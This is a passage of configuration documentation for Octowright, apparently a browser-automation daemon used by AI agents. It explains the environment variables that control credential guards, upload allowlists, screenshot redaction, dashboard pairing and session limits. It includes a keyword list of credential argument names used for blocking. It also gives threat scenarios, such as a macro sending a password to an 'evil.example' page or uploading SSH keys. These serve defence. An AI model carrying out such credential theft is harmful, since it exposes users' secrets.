`try_each`'s first branch), and as each step is dispatched -- an `if_selector` branch or a later `try_each` branch, and a called macro's steps, are refused when they run, so a branch the page never takes refuses nothing. The exported CLI applies both checks the same way, the up-front one before it opens a browser. A `macro_run_sequence` is judged as one run: the credential args any member types refuse page code in every member (`credential_sinks.page_code_refusal`, `credential_sinks.refuse_page_code`). Matching is **arg-name based** and delegates to the shared CREDENTIAL tier in `macros.privacy` rather than a private table of its own: substring-matched `access_key`/`api_key`/`apikey`/`authorization`/`credential`/`passphrase`/`passwd`/`password`/`private_key`/`pwd`/`secret`/`token`, token-matched `auth`/`authentication`/`bearer`/`cookie`/`cookies`/`otp`/`pw`, with camelCase split (`accessKey`) and plural forms (`tokens`) covered. `pwd` is the one short token matched by substring, so a fused name like `dbpwd` is caught -- and so is the shell's `OLDPWD` spelling, an accepted false positive: a parameter named `oldpwd` holding a directory path is refused in a sink. Token matching is what keeps `author` and `authority` out of it, and the identity/contextual tiers (`email`, `username`, `user`, `session`) are deliberately NOT sink-blocked, so `{{order_id}}` and `{{email}}` keep working in a URL — parameterized navigation is the common legitimate pattern and is untouched, as is `{{password}}` into a `fill` `value`. **0.23.0 widened this set**: through 0.22.1 the guard used a private table that missed `passphrase`, `pw`, `pwd`, `authorization`, `access_key`, `private_key` and plural forms, so a macro expanding one of those into a sink worked then and raises now. **Headers to the session's own origin are exempt:** `inject_headers` (and `mock_route`) whose pattern spells out, literally, the **origin** -- scheme, host and effective port -- of the session's launch URL or persona `base_url` may carry a credential -- `{"action": "inject_headers", "pattern": "https://app.example.test/**", "headers": {"Authorization": "Bearer {{token}}"}, "forward_on_redirect": {"Authorization": true}}` is the ordinary log-in-then-carry-the-token shape. For `inject_headers` the exemption is per header and needs `forward_on_redirect` (a literal `true`, never coerced; a name the step's `headers` does not carry is refused), because for a `fetch`/XHR the pattern scopes only the first hop: Playwright re-applies a routed header to every redirect the request follows, so an own-site `302` to another host carries it there (measured on Chromium and Firefox for every header, WebKit for all but `Authorization`). A session's navigations are matched per hop (see **Per-hop redirect checking** in `AGENTS.md`); fetch/XHR and an exported script's routes are not. Through 0.26.0 no opt-in was needed. `mock_route` headers are a response served to the page and stay exempt without one. The comparison is exact: a pattern with no scheme (`app.example.test/**`, `**/api/**`), another scheme, or another port is refused, and a missing port means the scheme's default (80/443) on both sides. Through 0.25.0 it compared hostnames only, so a launch at `http://localhost:3000` exempted `http://localhost:45678/**` -- whatever another local user had listening there. Those origins are operator-chosen and captured once at launch (`session.launch_url`, `session.base_url`); `session.url` follows every navigate, so an origin the macro navigates to -- in an earlier step, a `macro_call`'s parent or an earlier sequence member -- is not trusted. A no-URL launch onto Octowright's own new-tab page trusts nothing, but one that lands on an `OCTOWRIGHT_DEFAULT_URL` naming the operator's app trusts that app's origin. A wildcard, placeholder, userinfo or backslash in the pattern's host, or `set_extra_http_headers` (which rides every host the page contacts, third parties included), stays refused (`substitution.own_site_origins`). The action's `pattern` and `url_pattern` are one field: replay renames the first to the second, so an action carrying both with different values is refused rather than letting the guard judge one and replay install the other. **The exported macro CLI** (`macro_export_cli`) runs the same guard -- `octowright.credential_sinks` is rendered into the script verbatim, and the script's own classifier decides which arg is a credential -- so a macro `macro_run` refuses no longer runs to completion as a script. A script has no launch URL, so its own origin is whatever the operator passes as `--trusted-origin https://app.example.test` (repeatable; exact origins); with none, a credential header is refused as it would be for a session launched with no URL. A script also refuses, when an `inject_headers` step runs, a credential-named header (`http_headers.is_credential_header`, literal values included) the step's `forward_on_redirect` does not name, since a script's routes let a navigation redirect carry it; `allow` lifts that too. Scripts exported before this carry no guard at all; regenerate them. Set to `allow` (or a falsey token) for a suite that intentionally puts a token in a query string, or in a header to another host. Parser: `credential_sinks.credential_sinks_blocked` (re-exported by `macros.substitution`).
- `OCTOWRIGHT_MACRO_CREDENTIAL_FILL_ORIGINS` — what to do when a macro `fill`/`fill_by`/`type` whose value comes from a credential-tier arg (the same classifier as `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS`) would type into a page whose **current** origin -- scheme, host, effective port, read under the session's gate from the active frame or page immediately before the step, and again from the document that receives the value as it receives it (the frame owning the filled element; for `type`, the focused document before every key) -- is not one of the session's own origins (launch URL, persona `base_url`) and not listed in the step's `allowed_origins`. `block` (**the default**) refuses the step, naming the origin (never its path) and both ways to allow it. `warn` logs `octowright.macro.credential_fill_offsite`, adds `credential_fill_offsite: [{step, action, origin}]` to the macro run result, or to its failure payload when a later step fails (names and origins only, never the value) and lets the step run. **Any other value, including a typo, is `block`** -- this fails closed, the opposite of most knobs here, because a mistyped `warn` must not become "no check". `OCTOWRIGHT_MACRO_CREDENTIAL_SINKS=allow` turns this check off along with every other credential check. Why it exists: `value`/`text` is the intended destination of a credential, so the sink guard lets `{{password}}` through there -- but a shared macro that navigates to `https://evil.example/login` first and then fills `{{password}}` handed the secret to that page's script. **Behavior change:** a macro launched at one origin that types a password on another (a sign-in page on a separate IdP, or a no-URL launch onto the new-tab page that then navigates to the login form) is now refused until the step lists the origin: `"allowed_origins": ["https://login.idp.example"]` -- exact origins, written literally, no wildcard, path or `{{placeholder}}` (refused by replay and reported by `macro_lint`). Identity and contextual args (`{{email}}`, `{{username}}`) are never checked. A credential `fill` takes its selector's first match and a `fill_by` is strict, as the same step without a credential is. A credential `type` goes one key at a time and stops the rest of the value -- failing the step with a message naming the step, never the value -- when the focused document is not the one that took the previous key (any navigation, same-origin included, or focus moving into another frame), when focus moves to the body or nothing after an element took the first key (the first key itself may go to the body, for a target that cannot take focus), or when focus moves to an element that takes no text other than the one the first key went to. The whole step is bounded by one budget: a `fill`/`fill_by` gets the step's `timeout_ms`, else `OCTOWRIGHT_ACTION_TIMEOUT_MS`; a `type` takes no `timeout_ms` and gets the action timeout plus `len(text) * delay_ms`, so its own pauses are not counted (the exported CLI uses Playwright's 30s default where the step names no `timeout_ms`, and for every `type`); see [macros.md](macros.md). The exported macro CLI enforces the same rule against its `--trusted-origin` values, reporting a warn-mode pass as a `credential_fill_offsite` line on stderr. Parser: `credential_sinks.credential_fill_mode`.
- `OCTOWRIGHT_NO_TEXT_ELEMENT_LIMIT` — how many elements the macro `expect_no_text` assertion reads under its selector before it refuses to pass (default `20000`). A scan that reaches the limit and did not find the text **fails** -- it does not pass on a page it only partly read -- and says to narrow the selector or raise the limit. A step's own `element_limit` overrides this. A value that is not a positive integer keeps the default rather than removing the limit or setting one no page can pass; an unusable step `element_limit` is refused. Exported CLI scripts read the same variable at run time. Parser: `drawn_text.resolve_element_limit`, which the exported CLI renders verbatim.
- `OCTOWRIGHT_UPLOAD_STAGING_DIR` — the one directory an upload (`browser_set_input_files`, `browser_upload_files`, a macro `set_input_files`/`upload_files`) may read from by default (default `<config dir>/uploads`, e.g. `~/.config/octowright/uploads`). A path is resolved, symlinks included, and must land under an allowed root; the daemon's CWD is deliberately **not** one, so a page the agent is driving cannot talk it into uploading a project's `.env` or an SSH key. The exported macro CLI resolves this where the script **runs**, by the same rule, rather than carrying the exporting user's absolute path. Parser: `config_paths.upload_staging_dir`; allowlist: `session.upload_paths.upload_roots` / `check_upload_path`, which the exported CLI renders verbatim.
- `OCTOWRIGHT_UPLOAD_ROOTS` — extra upload roots beside the staging dir, `os.pathsep`-separated (`:` on POSIX, `;` on Windows). Each is resolved; an entry that cannot be resolved is skipped rather than failing every upload. Unset means the staging dir only. Read by the daemon at startup (`defaults.UPLOAD_EXTRA_ROOTS_RAW`) and by an exported macro CLI when it runs.
- `OCTOWRIGHT_MACRO_BLIND_SCRUB_POLICY` — which classified macro values may be replaced without field provenance across diagnostics, JSONL rows, artifacts, screenshots and generated scripts. **`credentials` by default:** only credential-tier values enter blind scrubbers and the permanent session ledger; identity/context values such as `email`, `user` and `session` remain structurally redacted from known argument fields but do not corrupt unrelated selectors, URLs or prose. `all` blindly scrubs every classified tier, except identity/context values the length floor or common-value list exempts (`OCTOWRIGHT_MACRO_SCRUB_MIN_LENGTH`, `OCTOWRIGHT_MACRO_SCRUB_COMMON_VALUES`), and scrubs the identity/context values it admits for their own run only (`OCTOWRIGHT_MACRO_SCRUB_RUN_SCOPED`); a value it does admit can still rewrite text that contains it during that run. `reject` refuses an invocation containing identity/context values before browser or artifact side effects, listing only argument paths and tiers. Credential values are always admitted at every length. Parsing trims whitespace and ignores case; any other value raises. Parser: `macros.privacy.blind_scrub_policy`.
- `OCTOWRIGHT_MACRO_SCRUB_MIN_LENGTH` — under `OCTOWRIGHT_MACRO_BLIND_SCRUB_POLICY=all`, an identity/context macro value shorter than this many characters is not blind-scrubbed (#247). **Default `4`**: below four characters a value is a small number, an initial or a two-letter code (`1`, `42`, `en`), the strings that also make up selectors (`nth-child(1)`), query strings (`?page=1`) and prose, and four is the boundary the scrub engine already uses for word-bounded matching. `0` disables the floor. **Never applies to a credential-tier value**, which is scrubbed at any length. The value stays structurally redacted from `args_used`, and the run result names it in `scrub_exempt_args` by path and reason (`short`), never by value. Unset or blank keeps the default; **anything that is not a non-negative integer (`four`, `-1`, `2.5`) disables the floor**, the side that scrubs more, so a typo never exempts a value. Parser: `macros.scrub_admission.scrub_min_length`, which the exported CLI also embeds.
- `OCTOWRIGHT_MACRO_SCRUB_COMMON_VALUES` — under `all`, identity/context values on this list are not blind-scrubbed (`reason: common` in `scrub_exempt_args`). **Default** `admin, administrator, anonymous, default, demo, example, guest, none, null, root, test, tester, user`: shared test-account and placeholder vocabulary that also occurs as ordinary words in pages, selectors and routes (`#admin-menu`, "Guest checkout"). Kept small because each entry is a value someone could want hidden. Comma-separated, compared ignoring case and surrounding space. A value starting with `+` **extends** the default (`+acme-demo,staging`); any other value **replaces** it; an empty value (or only commas) replaces it with nothing, which disables the list -- the side that scrubs more. Never applies to a credential-tier value. Parser: `macros.scrub_admission.scrub_common_values`, embedded in the exported CLI.
- `OCTOWRIGHT_MACRO_SCRUB_RUN_SCOPED` — whether identity/context values admitted under `all` are scrubbed only for the run that supplied them (nested calls included) and dropped from the session ledger when it ends, pass or fail (#247). **On by default**: such a value is not a secret, and scrubbing it for the session's lifetime rewrote every later row and `macro_run_sequence` step that contained it; the cost is that a page echoing it after the run records it in clear. `0`/`off`/`false`/`no`/`never`/`none`/`disabled` turn it off, restoring session-wide scrubbing for them. Unset, empty, `1`/`on`/`true`/`yes`/`always` mean on; **any other value means off** (session-wide), the side that scrubs more. Credential-tier values are session-wide regardless. Parser: `macros.scrub_admission.scrub_run_scoped`; the run scope lives on `macros.privacy_ledger.SessionPrivacyLedger`.
- `OCTOWRIGHT_MACRO_SCRUB_MAX_VALUES` — how many session-wide values (credentials, and passwords typed into a password field) a session's scrub ledger holds before the session is marked `scrub_saturated` (#248). **Default `256`**: far above a real session's handful of credentials, low enough that a runaway loop of generated passwords is stopped before the per-write scrub dominates the session's cost. Run-scoped identity/context values are not counted. `0` disables the cap. **The cap never drops or skips a value** -- every value that reaches the ledger is still scrubbed, because a value left out of the scrub set is a value written in cleartext, and privacy wins over cost. Saturation is sticky for the session; the only enforcement is that a macro run (`macro_run`, a sequence step, `macro_artifact_run`, a nested `macro_call`) that would add a value the ledger does not already hold is refused with an invalid-request error before it runs or writes anything, while a direct password `browser_fill` is never refused. Unset or blank keeps the default; **anything that is not a non-negative integer also keeps the default**, logged once as `octowright.macro.scrub_max_values_invalid` -- falling back to "no cap" would let a typo remove the bound. Parser: `macros.scrub_capacity.scrub_max_values`; the count and flag live on `macros.privacy_ledger.SessionPrivacyLedger`.
- `OCTOWRIGHT_LEDGER_SCREENSHOTS` — what `BrowserSession.screenshot` (every `browser_screenshot`, `browser_each` and capture-and-close) does once the session's privacy ledger holds a value — a password typed into a password field, a macro credential. **`refuse` by default**: the screenshot goes through the privacy boundary (`safe_screenshot.ledger_screenshot`), which on Chromium redacts the value, proves it is not rendered, captures and restores the page, and on Firefox/WebKit, which cannot prove that, refuses and writes no file. `allow` takes the raw screenshot, so a PNG can show a password the page itself displays. It exists because the only other way back to screenshots after a login was `OCTOWRIGHT_REDACT_INPUTS=off`, which also stops redacting the recordings. **Anything but `allow` means `refuse`** (case and surrounding space ignored; an unknown value logs `octowright.screenshot.ledger_policy_unknown`) — a typo must not decide that a password reaches a PNG. A privacy handler an embedding application installed (`safe_screenshot.enable_redacted_screenshots`) still decides under `allow`. Independent of `OCTOWRIGHT_MACRO_CLASSIFIED_SCREENSHOTS`, which governs a macro's own `screenshot` step. <!-- pragma: allowlist secret (policy prose, not a credential) -->
- `OCTOWRIGHT_MACRO_CLASSIFIED_SCREENSHOTS` — what a macro `screenshot` does while the run holds values admitted by `OCTOWRIGHT_MACRO_BLIND_SCRUB_POLICY` and the embedding application installed no handler. **`refuse` by default.** `redact` takes a redacted screenshot of a Chromium page instead, with animations paused and every running view transition ended (one that cannot be ended refuses). Every raw, JSON-escaped and URL-encoded spelling of the run's policy-admitted values is replaced in text and attribute values (document, open and closed shadow roots), ignoring case, whitespace, compatibility forms, control and invisible characters inside the value, and matching a numeric value by its digits. A text control holding a value is masked with `-webkit-text-security` and keeps its value and caret; every other input but a file input has its value replaced. `canvas`, `video`, `embed`, `object`, `frame` and `iframe` elements, any element (or `<picture>` image) whose resource address holds a value, and any SVG image or `use` whose link an `<animate>` or `<set>` targets (unless a `use` only swaps fragments of the same document), are hidden with `visibility: hidden` and `opacity: 0` and their transitions off, element and attribute names judged by their local names whatever their prefix (a filter image with an animated link refuses); resource addresses are never rewritten. Once the redaction is done and Chrome has applied the page's pending style changes (a style update it cannot apply refuses), page changes are counted: Chrome's DevTools events for DOM, stylesheet and animation changes, and the page controller for inline styles that could reveal a value, form state, focus and the hash. Before and after the capture, the screenshot is refused and deleted if a change was counted, if a view transition is running on the document or a redacted element or Chrome still draws one in any root, if the redacted page still holds a value, or if Chrome's rendered surface does (`DOMSnapshot.captureSnapshot`: layout text and text boxes matched joined, reversed, in visual order and with a few interleaved boxes; unmasked form values; `placeholder`/`alt`/`label`; resource addresses; image styles including `content: url()`). The capture uses `Page.captureScreenshot`, not Playwright's screenshot helper. The page is then restored without replaying hidden elements' transitions: a text, control value, attribute or style property comes back only while it still holds what the redaction left, so a value the page changed meanwhile stays, though a style attribute that held a value comes back whole if the page changed it in place; if the restore fails or is cancelled, the screenshot is deleted. The page is trusted not to hide changes deliberately; see [macros.md](macros.md) for the limits. Firefox and WebKit refuse. Any other value raises for a macro `screenshot` action, and suppresses automatic artifact screenshots rather than failing the run. An application-installed handler (`octowright.macros.safe_screenshot.enable_redacted_screenshots(session, handler=...)`) always wins, and automatic artifact screenshots never bypass it. Parser: `macros.safe_screenshot.classified_screenshot_policy`.
- `OCTOWRIGHT_SSRF_ALLOW` — comma-separated host allowlist that overrides `OCTOWRIGHT_SSRF_POLICY=block-private` for legitimate internal targets (exact host match, e.g. `10.0.0.5,internal.box`).
- `OCTOWRIGHT_DASHBOARD_REQUIRE_PAIRING` — dashboard pairing gate for the browser-facing surface (sessions/media/events/tail/screencast/writes). **ON by default.** Loopback binding plus the Host/Origin guards stop a *remote* attacker and a *malicious web page*, but they are not authentication: any other local process that could open a socket to the port could enumerate live sessions, read recorded JSONL (typed input, navigated URLs, console output), fetch video, subscribe to the live screencast, and drive the browser — which made the on-by-default `0600` recordings and `0700` profiles overstated, since the daemon served the same bytes over HTTP. Mint a bearer with `octowright dashboard` (prints a single-use `/pair#<code>` URL, 60s TTL); guarded routes also accept `X-Octowright-Token` for follower/programmatic callers. Set a falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) to restore the type-the-URL flow. An **empty value means ON**, matching `OCTOWRIGHT_RECORDINGS_PRIVATE` — only an explicit falsey token disables a security default. **Enforcement needs something to pair against, and a missing anchor is refused.** `octowright dashboard` authenticates with the leader's capability token, which an inline (`--no-singleton`) leader does not have (no lockfile). It used to degrade to *unenforced* there under the default, which served recordings and session control to every local user. `build_app` now gives a tokenless app a random in-memory anchor, so the gate is enforced on every app it builds; an inline leader prints a single-use pairing URL (600s) to stderr at startup, `octowright_dashboard_url` mints one in-process, and `/api/pair/mint` answers `503` pointing at both. A connection with no pairing state at all -- an embedder mounting these routes on its own Starlette app -- is refused while the gate is on; set this knob falsey to opt out. `tests/test_dashboard_pairing_default.py` pins all of it. `/api/mcp-events` is pairing-exempt on a daemon leader, where it already demands the capability token, a strictly stronger credential; an inline leader has no token, so there the pairing gate guards it like every other route (`http/routes/mcp_events.routes`). **Getting the URL from an agent:** `octowright_dashboard_url` mints a pairing code itself and returns a ready-to-open `/pair#<code>` URL (plus `plain_url`, `pairing_required`, `pairing_expires_in`, `pairing_hint`), so "show me the dashboard" works in one step from a chat client with no terminal — otherwise the agent would hand the user a link that 401s. `octowright_status()` also reports a dashboard URL; it stays the **plain** address (status is polled often, and minting there would churn the bounded code store and could evict a code the user was just handed) and carries `dashboard_pairing_required` so the agent knows to call `octowright_dashboard_url` for an openable link instead of showing the bare one. **The MCP surface itself is untouched by pairing:** the gate is applied by `exposure.guard_sensitive_http` per route, while the follower bridge talks to the mounted `/mcp` ASGI app guarded by `SensitiveASGIGuard` + `BridgeTokenGuard` — verified, and pinned by `tests/test_pairing_leaves_mcp_working.py`, which also pins that `/new-tab` (a launched browser has no bearer), `/pair`, and the SPA shell stay reachable unauthenticated. That mint uses a longer window (`MCP_PAIR_CODE_TTL_SECONDS`, 600s) than the CLI's 60s, because a human reading an agent's message needs longer than an operator pasting from their own terminal; it stays single-use and loopback-only. Minting from MCP grants nothing new — the `/mcp` transport is gated by the *same* capability token the pairing store checks, so an MCP caller is already inside the trust boundary, and where that gate is off the caller can already drive browsers. `build_app` publishes the store through `http/state.set_dashboard_pairing` (the tool has no handle on the Starlette app); that is process-global, so `tests/conftest.py` isolates it per test or one test's token-carrying app lends its store to the next. **Arriving without a bearer is the normal case, and the page says so:** the corner badge injected into every launched browser links to the dashboard, and those links can never carry a pairing code -- a code is single-use with a 60s TTL, and the init script that would hold one runs *in the page*, where every site the browser visits could read it. A bookmark, a typed address, and a leader restart all land the same way. So an unpaired arrival renders a blocking gate (`packages/octowright-frontend/src/pairing-gate.ts`) that names both routes back in, rather than the panel tree, which asserted **"No live sessions."** while sessions were running and promised **"Retrying automatically."** after `authRequired` had already called `stopPolling()` -- the only accurate message was a snackbar that self-hid after 3.5s. `bootDashboard`'s tick bails on `authBlocked` *before* rendering, so that false state is never painted at all: the 401 handler runs synchronously inside `loadState`'s own fetches. The gate distinguishes only the two states a browser can actually tell apart -- no bearer was ever held, versus one the leader refused -- because "it expired" and "the daemon restarted and forgot every pairing" are the same 401 from there, and the copy names both instead of guessing. See **Bridge capability token → Browser dashboard**.
- `OCTOWRIGHT_BRIDGE_REQUIRE_TOKEN` — require the `X-Octowright-Token` capability token on the leader's `/mcp` transport **and the follower-only `/api/mcp-events` SSE channel**. **ON by default.** Set a falsey token (`0`/`off`/`false`/`no`/`never`/`none`/`disabled`) to disable the gate. See **Bridge capability token** for the threat model + honest limits.
- `OCTOWRIGHT_LOCK_PATH` — where the singleton leader writes its lockfile (default `<user state dir>/octowright.lock`). Meant for hermetic tests that spawn a real daemon without touching the user's lockfile. **The lockfile holds the bridge capability token**, so it is part of the same-user trust boundary: `singleton.write_lock` creates it `0600` from the first byte (`mkstemp`, `O_EXCL`, a random temp name, then `os.replace`) and forces its parent to `0700`. Pointing this into a directory you do not own (a shared state dir, `/tmp`) means that parent chmod fails -- logged as `singleton.lock_parent_chmod_failed` rather than swallowed -- and other users who can write the directory can replace or unlink the lockfile, which is the lockfile-poisoning case the bridge token explicitly does not defend (see **Bridge capability token** in `AGENTS.md`). Keep it in a directory only you can write.
- `OCTOWRIGHT_MIN_FREE_MEMORY_MB` — memory-pressure launch governor (H4b). **OFF by default.** When set to a positive MB floor, every user-facing launch path (`browser_launch` / `browser_quick_launch` / `browser_spawn_roster` **and `scenario_start`**) refuses a launch while *available* memory is below it, heading off the low-memory → renderer-crash cascade. The cap and this floor are enforced in the pool layer (`browser_pool.limits`, at the `roster.spawn_roster` chokepoint plus single-launch shims) so the scenario path — which calls `pool.spawn_roster` directly — can't bypass them; internal relaunch/handoff/crash-recovery go through `pool.launch` and are intentionally uncapped. Available memory is read per-platform (Linux `/proc/meminfo` `MemAvailable`; macOS `vm_stat` free+inactive+speculative+purgeable) by `octowright.sysresources` — NOT a sysconf one-liner, because the macOS "free" count reports cache/purgeable RAM as used and would false-refuse. An unreadable value never refuses. `0`/`off`/`never`/`none`/`disabled` keep it off. Surfaced at `octowright_status()["pool"]["min_free_memory_mb"]` / `["available_memory_mb"]` (both null when off). The value lives in `octowright.sysresources.MIN_FREE_MEMORY_BYTES`, mirroring how `incidents`/`health` keep their own `OCTOWRIGHT_*` knobs.
- `OCTOWRIGHT_DRIVER_RELAUNCH` — driver-death lost-session handling (H4a). When the shared Playwright driver dies and self-heals (P3), every browser that rode it is gone; Octowright **always** captures + surfaces those lost sessions at `octowright_status()["pool"]["lost_sessions"]` (each `{instance_id, kind, url, profile, reason, relaunched_to}`). This knob controls whether it also auto-reopens them to their last URL/profile: `off` (DEFAULT) surface only — no instance_id churn, no surprise navigation; `new-id` reopens with a fresh instance_id (the lost record maps old→new, clients must rebind); `keep-id` reopens and rebinds the ORIGINAL instance_id so existing client handles keep resolving (best-effort — the recording file stays under the fresh id; navigation re-runs either way). Loop-guarded: an auto-reopened session that dies with a later driver is still captured, surfaced and evicted (its lost record carries `relaunch_skipped: already_relaunched`), but not reopened a second time. **Also governs a single browser-process crash** (`browser_pool.process_crash`: the browser died on a signal while its session was live, not a closed window): it is surfaced in `lost_sessions` with `reason: browser_process_crashed` whatever the mode, and reopened onto its last URL/profile under `new-id`/`keep-id` exactly as a driver loss is — after the dead context's teardown, so the profile lock is free — but only when the verdict rests on `SingletonLock` evidence (headed Chromium), never on liveness alone, and never when an explicit close/handoff/fluid relaunch already owns the session. Off by default here too, deliberately: a window close misjudged as a crash must never bring the window back unasked. A failed reopen is recorded as `relaunch_error` on the lost record (either path) and, for a process crash, as incident `outcome: failed` plus a `browser_recovered(scope="process", outcome="failed")` notification. The value/parser live in `octowright.browser_pool.driver_relaunch` (`DRIVER_RELAUNCH_MODE` / `parse_mode`).
- `OCTOWRIGHT_BRIDGE_SUSPEND_THRESHOLD_SECONDS` — follower suspend-detection threshold (default `5.0`). The deadline watchdog (`proxy_supervisor.watch_deadlines`) times the wall-clock gap between its own iterations; a gap exceeding its sleep interval by more than this means the follower **process** was frozen (an MCP client SIGSTOPped it — e.g. Codex/Claude compaction), not normal jitter. On detection it shifts every in-flight request's `time.monotonic` deadline forward by the frozen span so a call the freeze stranded isn't falsely timed out the instant the follower resumes (its deadline would otherwise already be blown). It deliberately does **not** force a reconnect — the reactive reset→resume path reconnects if the connection actually died, and forcing one here races the in-flight forward. Pairs with the reconnect replaying the **full** `initialize` + `notifications/initialized` handshake — replaying only `initialize` leaves the fresh leader session half-initialized, so the next tool call gets a 400, the failure a real follower hits after a compaction freeze. Counted by `octowright_bridge_suspension_total`. Const lives in `proxy_supervisor.SUSPEND_THRESHOLD_SECONDS`.
- `OCTOWRIGHT_HEARTBEAT_INTERVAL_SECONDS` / `OCTOWRIGHT_HEARTBEAT_MAX_SECONDS` — leader-side progress-heartbeat cadence (default `8.0`) and absolute ceiling (default `600.0`). The follower injects a synthetic `progressToken` into every `tools/call` and re-arms that request's in-flight deadline on each `notifications/progress` it sees (`proxy_supervisor._rearm_deadline`) — but **nothing on the leader emitted those pings**, so the whole re-arm path was dead and the bridge fell back to static per-tool timeout guessing (`BRIDGE_TOOL_TIMEOUTS`). A genuinely-working call that outran its static budget (a slow `browser_expect_*`/`scenario_start`/`browser_wait_for` on a sluggish site — none of which even have a per-tool override, so they used the flat 20s `BRIDGE_REQUEST_TIMEOUT_SECONDS`) then surfaced to the agent as a **spurious "Octowright disconnected"**, and per `BRIDGE_ERROR_GUIDANCE` the agent told the user to reconnect a healthy server. `server/_heartbeat._progress_heartbeat` (the OUTERMOST tool wrapper in `server/_state.py`) closes this: while a tool handler runs, a background task sends progress on the injected token every interval. The first ping lands before the flat 20s deadline, so **every** tool — even those with no `BRIDGE_TOOL_TIMEOUTS` entry — is re-armed and stays alive as long as the leader event loop is alive to run the heartbeat. The three failure modes now resolve predictably: *slow but alive* → pings flow, no false disconnect; *leader loop wedged/dead* → the heartbeat can't run either, so pings stop and the deadline expires fast (a real problem, surfaced quickly); *handler wedged past its own internal timeout* → pings stop at the ceiling, bounding the worst-case single-call hang instead of hanging the agent forever. The ceiling must exceed the longest legit single call (a big `macro_run_sequence`) or the agent's post-timeout retry would double-execute the side effect. A client that supplies its OWN `progressToken` receives these pings as normal progress (it opted in); a bridge-synthetic token is swallowed by the follower and never reaches the client. Consts live in `server/_heartbeat.py`.
- `OCTOWRIGHT_BRIDGE_MIN_SESSION_SECONDS` — flap-guard threshold for the follower reconnect loop (default `2.0`). The success path of `proxy_runtime.run_supervised_proxy` (a session that ended cleanly, vs. the error path) had **no backoff** — so if the leader accepted a connection then ended the session almost immediately, the follower reconnected with zero delay, busy-looping the leader into a `Created new transport` / `Terminating session` storm (observed at ~300+ transports/sec across several live followers, starving real tool calls). Now a cleanly-ended session that lived **shorter than this** is treated as a *flap* and backed off via `reconnect_delay(flap_attempt)` (increasing, capped at `OCTOWRIGHT_BRIDGE_RECONNECT_MAX_SECONDS`), counted as `octowright_bridge_reconnect_total{reason="session_flap"}`; a session that lived at least this long reconnects promptly and resets the flap counter. The decision lives in the pure `proxy_runtime._post_session_backoff`; the const is in `proxy_runtime`. NOTE: this is follower-side — it takes effect for followers spawned after the fix; already-running old followers keep storming until their client reconnects.
- `OCTOWRIGHT_MCP_SESSION_IDLE_SECONDS` — reap an idle StreamableHTTP MCP session after this many seconds. **OFF by default**, mirroring `OCTOWRIGHT_IDLE_GRACE`'s philosophy: nothing pings the leader to reset a session's idle deadline between real tool calls (only an in-flight call's progress heartbeat does, via `server/_heartbeat.py`), so an ordinary interactive gap — reading output, deciding what to say, watching a slow build/CI run — looks identical to an abandoned session to this timer. Two prior defaults (300s, then 3600s) both reaped live, wanted sessions during normal silence; there is no timeout short enough to catch an abandoned reconnect-storm session without also risking a real one that pauses that long. Set a positive number (e.g. `1800`) to opt in on a shared/CI host that wants bounded memory over long-lived idle sessions; unset/`0`/`off`/`never`/`none`/`disabled` keep it off (the mcp library's own default — it never reaps). When enabled, `http/app.py` sets the timeout on the manager after `streamable_http_app()` builds it (via `_apply_mcp_session_idle_timeout`); the manager resets the deadline on each request, so an ACTIVE session is never reaped — only a truly idle/abandoned one, whose `run_server` task then exits and frees its memory. Without it, an unbounded reconnect-storm (see `OCTOWRIGHT_BRIDGE_MIN_SESSION_SECONDS`) can still leak ~54KB per abandoned session (observed a leader at **2.4GB RSS with zero live browsers** after ~17h; a worse case with heavier concurrent-follower load reached **18.8GB** over ~4.7 days on 2026-07-09) — the flap-guard and split-brain fixes reduce how often such storms happen, but this knob is the direct bound if one still gets through. The parser lives in `http/app.py`. **Complementary, unconditional reaper:** `housekeeping._reap_dead_follower_sessions_once` runs every housekeeping cycle regardless of this knob, and reaps by *PID liveness* instead of idle time — bridge-state.json already carries each follower's `(follower_pid, remote_session_id)`, so a follower whose OS process is confirmed gone is terminated immediately, with zero risk of false-positiving on a live client that's merely quiet (the exact risk that keeps idle-time reaping off by default). See `housekeeping.py`'s module docstring (job 3) and `octowright_follower_session_reaped_total` in the metrics table in [telemetry.md](telemetry.md). See **Leader-side storm protection** for the on-by-default rate-limit + session-cap that bound an *active* storm this reaper can't touch.
- `OCTOWRIGHT_MCP_MAX_SESSIONS` — the concurrent-`/mcp`-session cap housekeeping job 4 LRU-evicts back down to (see **Leader-side storm protection** in [AGENTS.md](../AGENTS.md) for the eviction ordering). **Default 256** (on); `0`/`off`/`never`/`none`/`disabled`/non-positive disables. Parser + eviction selector in `http/mcp_flap_guard.py`.
- `OCTOWRIGHT_MCP_NEW_SESSION_MAX` / `OCTOWRIGHT_MCP_NEW_SESSION_WINDOW_SECONDS` — the per-source new-session rate limit's threshold and window (**defaults 10 per 10s**, on; see **Leader-side storm protection** in [AGENTS.md](../AGENTS.md)). A falsey `OCTOWRIGHT_MCP_NEW_SESSION_MAX` disables the limiter. Parser in `http/mcp_flap_guard.py`.
- `OCTOWRIGHT_PROTECT_HEADED` — protect HEADED, non-ephemeral browsers at launch
  by default (a reflex `browser_close` is refused; `force=True` still closes).
  **ON by default**; `=0` disables. Headless is never auto-protected.
  Outranked by `OCTOWRIGHT_PROTECT_BROWSERS=1` (protect all). Parser/const:
  `defaults.PROTECT_HEADED_DEFAULT`; resolver `browser_pool.options.resolve_protected`.
- `OCTOWRIGHT_HEADED_LAUNCH_CONCURRENCY` — how many **headed** browsers
  `spawn_roster` may launch at the same instant (**default 3**), via a per-call
  `asyncio.Semaphore`. A big headed roster/scenario now starts in batches rather
  than firing every window creation simultaneously; **headless is never
  throttled** (`headed is False` bypasses the gate entirely, and `headed=None`
  resolves headed-by-default so it goes through it). Explicitly **defensive
  hardening, NOT a proven crash fix** — characterisation of the recurring
  headed-Chromium crash reproduced it through rapid *sequential* `browser_launch`
  churn, and concurrent `spawn_roster` launches did *not* reproduce it; bounding
  simultaneous window creation is merely prudent, since window-server/GPU pressure
  scales with it. The exact churn trigger is still under investigation. An
  unparsable value falls back to the default; the floor is 1 (a non-positive value
  would deadlock). Parser/const: `browser_pool.limits.headed_launch_concurrency` /
  `HEADED_LAUNCH_CONCURRENCY_DEFAULT`.
- `OCTOWRIGHT_UNBOUNDED_CALL_TIMEOUT_SECONDS` — per-call budget on a
  Playwright call that accepts no `timeout` of its own (`evaluate`, `title`,
  `content`, and every other such call site — all routed through
  `session/timeouts.bounded` and pinned there by an AST scan,
  `tests/session/test_no_unbounded_calls.py`, rather than a count kept by
